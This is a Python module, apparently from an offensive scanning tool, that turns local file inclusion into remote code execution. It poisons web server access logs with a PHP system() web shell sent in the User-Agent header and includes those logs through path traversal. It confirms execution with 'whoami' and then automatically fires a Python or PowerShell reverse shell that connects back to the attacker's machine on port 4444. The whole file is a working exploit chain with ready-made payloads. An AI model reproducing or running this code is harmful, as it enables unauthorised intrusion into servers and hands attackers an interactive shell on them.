import aiohttp
import asyncio
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

async def exploit_lfi_to_rce(url, param, log_callback=None, headers=None, proxy=None):
    """
    DEEP IMPACT: RCE Verifier & C2 Connector.
    Escalates LFI to RCE and immediately triggers a Reverse Shell.
    """
    findings = []
    
    # 1. Poisoning Phase
    # Inject PHP payload into User-Agent
    payload = "<?php system($_GET['c']); ?>"
    user_agent = f"Mozilla/5.0 {payload} Firefox/99.0"
    
    poison_headers = headers.copy() if headers else {}
    poison_headers['User-Agent'] = user_agent 
    
    # Common Log Paths
    log_paths = [
        "/var/log/apache2/access.log",
        "/var/log/httpd/access_log",
        "/var/log/nginx/access.log",
        "C:\\xampp\\apache\\logs\\access.log"
    ]
    
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if param not in params: return []

    try:
        async with aiohttp.ClientSession(headers=poison_headers) as session:
            # Step A: Poison the log
            try:
                # Fire and forget (to poison)
                async with session.get(url, timeout=5, ssl=False, proxy=proxy) as resp: pass
            except Exception: pass
            
            # Step B: Trigger RCE
            for log_path in log_paths:
                traversal = "../" * 5
                target_lfi = f"{traversal}{log_path}"
                
                # Verify with 'whoami'
                p_copy = params.copy()
                p_copy[param] = [target_lfi]
                p_copy['c'] = ['whoami'] 
                
                exploit_url = urlunparse(parsed._replace(query=urlencode(p_copy, doseq=True)))
                
                try:
                    async with session.get(exploit_url, timeout=5, ssl=False, proxy=proxy) as r:
                        text = await r.text()
                        
                        # Check for RCE Success
                        is_linux = "www-data" in text or "root" in text
                        is_win = "nt authority" in text.lower()
                        
                        if is_linux or is_win:
                            user = "root/www-data" if is_linux else "SYSTEM/User"
                            if log_callback:
                                log_callback(f"   âš¡ RCE CONFIRMED! User: {user} (via {log_path})")
                                log_callback("   ðŸ´â€â˜ ï¸ SYSTEM CONQUEST: Initiating C2 Connection...")
                            
                            findings.append({
                                "type": "RCE via LFI (Log Poisoning)",
                                "severity": "Critical",
                                "detail": f"System Compromised. Executed 'whoami'.",
                                "evidence": f"Output snippet: {text[:100].strip()}"
                            })
                            
                            # Step C: AUTO-REVERSE SHELL (C2)
                            from core.c2_manager import c2_manager
                            attacker_ip = c2_manager.get_lhost_address(url)
                            attacker_port = "4444" 
                            
                            c2_payload = ""
                            if is_linux:
                                # Python3 Reverse Shell
                                cmd = f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{attacker_ip}\",{attacker_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
                                c2_payload = cmd
                            else:
                                # PowerShell Reverse Shell (Simple)
                                cmd = f"$client = New-Object System.Net.Sockets.TcpClient('{attacker_ip}',{attacker_port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
                                c2_payload = f"powershell -nop -c \"{cmd}\""
                            
                            # Execute C2 Payload
                            p_c2 = params.copy()
                            p_c2[param] = [target_lfi]
                            p_c2['c'] = [c2_payload]
                            c2_url = urlunparse(parsed._replace(query=urlencode(p_c2, doseq=True)))
                            
                            if log_callback: log_callback(f"   ðŸ“¡ Sending C2 Payload to {attacker_ip}:{attacker_port}...")
                            
                            # Fire C2 (Don't wait for response as it hangs)
                            try:
                                await session.get(c2_url, timeout=1, ssl=False, proxy=proxy)
                            except asyncio.TimeoutError:
                                if log_callback: log_callback("   âœ… C2 Payload Sent (Connection likely established!)")
                            except Exception: pass
                            
                            return findings

                except Exception: pass
    except Exception: pass
    return findings
